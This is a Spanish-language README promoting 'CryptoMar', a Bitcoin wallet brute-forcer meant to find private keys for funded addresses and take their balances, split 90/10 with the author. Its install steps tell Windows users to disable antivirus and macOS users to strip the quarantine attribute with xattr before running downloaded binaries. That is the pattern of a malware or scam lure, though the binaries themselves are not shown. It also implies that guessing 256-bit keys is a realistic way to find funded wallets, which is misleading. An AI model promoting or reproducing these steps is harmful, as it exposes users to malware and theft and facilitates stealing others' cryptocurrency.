# CryptoMar

CryptoMar es una herramienta de fuerza bruta de monederos Bitcoin de alto rendimiento, basada en una biblioteca personalizada en C++ y optimizada para macOS y Windows. El programa admite la generación y búsqueda de claves privadas y direcciones Bitcoin Bech32 (P2WPKH) a alta velocidad, con una interfaz amigable diseñada para usuarios comunes.

## 🚀 Características

* Generación ultrarrápida de direcciones Bitcoin utilizando una biblioteca nativa en C++.
* Soporte para direcciones Bitcoin Bech32 (P2WPKH).
* Generación y verificación multihilo con un uso mínimo de memoria.
* Base de datos actualizada con todas las direcciones P2WPKH existentes que tienen saldo, al día hasta principios de mayo de 2025.

## 🔓 ¿Cómo funciona?

### 🗝️ Generación de claves privadas y públicas

* El programa genera aleatoriamente un número de 256 bits, que se convierte en la clave privada.
* Se genera una clave pública a partir de la clave privada utilizando criptografía de curva elíptica (secp256k1).
* La clave pública se codifica dos veces (SHA-256 y RIPEMD-160) para crear un hash, que luego se utiliza para generar la dirección Bech32 (P2WPKH).

### 🚀 Cómo funciona la fuerza bruta de monederos

* El programa genera millones de claves privadas y sus direcciones Bech32 correspondientes.
* Cada dirección se verifica contra una base de datos de direcciones conocidas con saldos confirmados.
* Si se encuentra una dirección con saldo, se guarda la clave privada y se notifica al usuario.

## 🌐 ¿Cuántos monederos tienen saldo?

Al 20 de mayo de 2025, la base de datos del programa contiene **18,226,528** direcciones Bech32 (P2WPKH)** con saldos confirmados mayores a 0.00001 BTC.

## ❓ ¿Por qué el autor comparte este programa?

La fuerza bruta de claves privadas requiere una enorme cantidad de tiempo y potencia computacional. El autor creó este software para distribuir el proceso entre una gran cantidad de personas. El usuario que encuentre la clave correcta recibirá el 90 % de los fondos, mientras que el autor obtendrá el 10 %.

## 📥 Descarga e instalación

### 🪟 Para Windows

1. Desactiva el antivirus.
2. Abre la última versión: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
3. Descarga el archivo `CryptoMarInstaller.exe`
4. Sigue las instrucciones del instalador.

### 🍎 Para macOS

1. Abre la última versión: [CryptoMar Releases](https://github.com/HexaMar/HexaMar/releases/tag/v1.1.0)
2. Descarga el archivo `CryptoMarAPP.zip`
3. Abre el archivo `CryptoMarAPP.zip` desde la carpeta Descargas.
4. Abre la terminal, escribe lo siguiente y presiona Enter:
   ```bash
   xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
   ```
5. Ejecuta el programa `CryptoMar.app`

## ⚡ Versiones gratuita y de pago

* **Versión gratuita:** Velocidad y tiempo de ejecución limitados (hasta 100 horas).
* **Versión de pago:** Velocidad y ejecución ilimitadas.

Si el programa se cierra sin encontrar el archivo, asegúrate de que todos los archivos necesarios estén en la misma carpeta.

## 💡 Soporte

Para soporte, contacta al desarrollador o crea una *issue* en GitHub.  
Antes de utilizar el programa, por favor revisa los [Términos de uso](https://github.com/HexaMar/CryptoMar_EN/blob/main/README.txt)
